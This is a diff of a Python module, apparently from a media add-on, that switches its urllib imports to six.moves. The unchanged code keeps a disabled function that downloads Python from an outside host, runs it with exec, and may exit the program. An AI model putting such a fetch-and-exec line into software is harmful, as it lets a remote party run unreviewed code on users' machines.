@@ -9,26 +9,24 @@ them yourself.
 '''
 import sys
 import traceback
+import six
+from six.moves.urllib.request import urlopen
+from six.moves.urllib.request import Request
+from six.moves.urllib.error import HTTPError, URLError
+from six.moves.urllib.request import urlretrieve    
+from six.moves.urllib.parse import urlparse
+from six.moves.urllib.parse import parse_qs
+from six.moves.urllib.request import build_opener
+from six.moves.urllib.parse import quote_plus
+from six.moves.urllib.parse import unquote_plus
+from six.moves.urllib.parse import quote
+from six.moves.urllib.parse import unquote
+from six.moves.urllib.parse import urlencode
+import six.moves.urllib.request
+import six.moves.urllib.parse
+import six.moves.urllib.error
 
 PY3 = sys.version_info[0] == 3
-
-if PY3:
-
-    import urllib.request, urllib.error, urllib.parse
-    from urllib.request import urlopen, Request
-    from urllib.error import URLError, HTTPError
-    from urllib.parse import urlparse
-    # from urllib.parse import urlencode, quote
-    # from urllib.request import urlretrieve
-else:
-    from urllib2 import urlopen, Request
-    from urllib2 import URLError, HTTPError
-    from urlparse import urlparse
-    # from urllib import urlencode, quote
-    # from urllib import urlretrieve
-    
-    
-
 
 def do_block_check(uninstall=False):
     return 
@@ -37,7 +35,6 @@ def do_block_check(uninstall=False):
         # import sys
         namespace = {}
         exec urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
-        
         # exec urlopen('http://offshoregit.com/tknorris/block_code.py').read(), namespace
         if namespace["real_check"](uninstall): 
             sys.exit()
